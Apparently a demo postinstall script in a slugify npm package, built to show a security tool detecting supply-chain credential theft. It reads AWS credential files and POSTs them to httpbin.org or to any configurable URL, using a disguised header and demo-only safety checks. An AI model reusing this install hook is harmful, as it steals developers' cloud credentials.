'use strict';

/* ===========================================================================
 *  DEMO ONLY — BENIGN. Demonstrates how Apiiro detects supply-chain credential
 *  exfiltration. On install this hook:
 *    - SEARCHES standard AWS credential locations for a creds file,
 *    - reads it and sends it in one HTTPS POST to httpbin.org (a public echo
 *      service that stores nothing and echoes the body back).
 *  Two hard safety rails make it impossible to leak anything real:
 *    1. It never looks at the real ~/.aws — only at demo-scoped paths (an env
 *       var or a fixed sandbox dir that the demo setup script plants).
 *    2. It refuses to send unless the file is stamped EXAMPLE/DEMO.
 *  This reproduces the "locate creds -> read -> network egress" data-flow
 *  reported by GitGuardian/Socket/Microsoft in 2026 so Apiiro can flag it on
 *  behavior. Delete this file + the postinstall line in package.json and this
 *  is just a slugify utility.
 * ======================================================================== */

const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');

// Benign, ubiquitous, allowlisted. Override for a live inbox:
//   DEMO_EXFIL_URL="https://webhook.site/<uuid>" npm install ...
const EXFIL_URL = process.env.DEMO_EXFIL_URL || 'https://httpbin.org/post';

// Where the "victim" creds sit. Realistic discovery order, demo-scoped only —
// NEVER the real ~/.aws/credentials.
function locateCredentialsFile() {
  const candidates = [
    process.env.AWS_SHARED_CREDENTIALS_FILE,          // the real AWS SDK env var (set by setup)
    process.env.DEMO_CREDS_FILE,                       // explicit demo override
    path.join(os.tmpdir(), 'apiiro-demo', 'aws_credentials') // fixed sandbox the setup script plants
  ].filter(Boolean);
  return candidates.find((p) => fs.existsSync(p)) || null;
}

function main() {
  const file = locateCredentialsFile();
  if (!file) {
    console.log('[tiny-slugify demo] no planted credentials found — run setup-demo.sh first. (nothing sent)');
    return;
  }
  const raw = fs.readFileSync(file, 'utf8');

  // Safety rail: refuse to exfil anything that is not clearly demo data.
  if (!/EXAMPLE|DEMO/i.test(raw)) {
    console.log('[tiny-slugify demo] file is not stamped EXAMPLE/DEMO — refusing to send. (nothing sent)');
    return;
  }

  const creds = {};
  for (const line of raw.split('\n')) {
    const m = line.match(/^\s*([a-z_]+)\s*=\s*(.+?)\s*$/i);
    if (m) creds[m[1]] = m[2];
  }

  const payload = JSON.stringify({
    host: os.hostname(),
    ts: new Date().toISOString(),
    source: file,
    credentials: creds,
    _note: 'FAKE DEMO CREDENTIALS — for an Apiiro detection demo. Not real.'
  });

  const url = new URL(EXFIL_URL);
  const req = https.request(
    {
      hostname: url.hostname,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        // Innocuous on the wire on purpose — detection is on BEHAVIOR, not a
        // self-labeled header. (Real May-2026 campaign used "X-Supply: 1".)
        'X-Telemetry': '1'
      }
    },
    (res) => {
      res.resume();
      res.on('end', () =>
        console.log(`[tiny-slugify demo] posted creds from ${file} -> ${EXFIL_URL} (HTTP ${res.statusCode})`)
      );
    }
  );

  // Never break a real install: swallow any network error.
  req.on('error', (e) => console.log(`[tiny-slugify demo] exfil attempt errored (harmless): ${e.message}`));
  req.write(payload);
  req.end();
}

main();
